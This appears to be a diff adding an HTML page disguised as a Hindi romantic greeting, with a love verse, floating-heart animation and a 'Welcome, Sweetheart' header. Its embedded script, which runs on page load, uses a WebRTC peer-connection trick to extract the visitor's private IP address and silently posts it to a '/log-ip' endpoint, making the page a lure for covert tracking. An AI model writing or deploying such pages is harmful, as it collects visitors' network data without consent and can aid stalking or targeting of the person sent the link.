@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>❤️ Love </title>
+  <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&family=Raleway:wght@400;700&family=Tiro+Devanagari+Hindi&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Raleway', sans-serif;
+      background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
+      overflow: hidden;
+      color: #fff;
+      text-align: center;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+    }
+
+    h1 {
+      font-size: 2.8rem;
+      margin-bottom: 0.5rem;
+      font-family: 'Great Vibes', cursive;
+      color: #fff;
+      text-shadow: 2px 2px 5px rgba(0,0,0,0.3);
+    }
+
+    #status {
+      font-size: 1.2rem;
+      background-color: rgba(255, 255, 255, 0.2);
+      padding: 0.7rem 1.5rem;
+      border-radius: 10px;
+      margin-bottom: 2rem;
+      backdrop-filter: blur(5px);
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+    }
+
+    .quote {
+      font-family: 'Tiro Devanagari Hindi', serif;
+      font-size: 1.5rem;
+      background: rgba(255, 255, 255, 0.15);
+      border-left: 5px solid #fff;
+      padding: 20px;
+      margin-top: 1rem;
+      width: 85%;
+      max-width: 700px;
+      border-radius: 12px;
+      box-shadow: 0 8px 16px rgba(0,0,0,0.3);
+      animation: fadeIn 2s ease;
+    }
+
+    .quote::before {
+      content: "❝";
+      font-size: 3rem;
+      color: #fff;
+      vertical-align: top;
+      margin-right: 5px;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .hearts {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      overflow: hidden;
+      z-index: 0;
+    }
+
+    .heart {
+      position: absolute;
+      width: 20px;
+      height: 20px;
+      background: url('https://emojiapi.dev/api/v1/2764.svg') no-repeat center;
+      background-size: contain;
+      animation: floatUp 8s linear infinite;
+      opacity: 0.7;
+    }
+
+    @keyframes floatUp {
+      0% {
+        transform: translateY(100vh) scale(0.5);
+        opacity: 0;
+      }
+      30% {
+        opacity: 1;
+      }
+      100% {
+        transform: translateY(-10vh) scale(1.5);
+        opacity: 0;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="hearts" id="heartContainer"></div>
+
+  <h1>❤️ Welcome, Sweetheart</h1>
+  <div id="status">तुम्हारे लिए कुछ अर्ज किया है...</div>
+
+  <div class="quote">
+    तेरे नए इश्क की नई कहानी मुबारक हो,<br />
+    तेरे आशिक को तेरी जवानी मुबारक हो।<br />
+    और तु वही जाम है जो रहता कभी होंठों पर,<br />
+    तेरे नए आशिक को मेरा झूठा पानी मुबारक हो...
+  </div>
+
+  <script>
+    async function getPrivateIP() {
+      return new Promise((resolve) => {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel("");
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+        pc.onicecandidate = event => {
+          if (!event || !event.candidate) return;
+          const match = event.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3})/);
+          if (match) {
+            resolve(match[1]);
+            pc.close();
+          }
+        };
+      });
+    }
+
+    getPrivateIP().then(ip => {
+      document.getElementById("status").innerText = "💘 तुम्हारा IP: " + ip;
+
+      fetch('/log-ip', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ip })
+      });
+    });
+
+    // Floating hearts
+    function createHeart() {
+      const heart = document.createElement('div');
+      heart.className = 'heart';
+      heart.style.left = Math.random() * 100 + 'vw';
+      heart.style.animationDuration = (6 + Math.random() * 4) + 's';
+      document.getElementById('heartContainer').appendChild(heart);
+
+      setTimeout(() => {
+        heart.remove();
+      }, 10000);
+    }
+
+    setInterval(createHeart, 500);
+  </script>
+
+</body>
+</html>
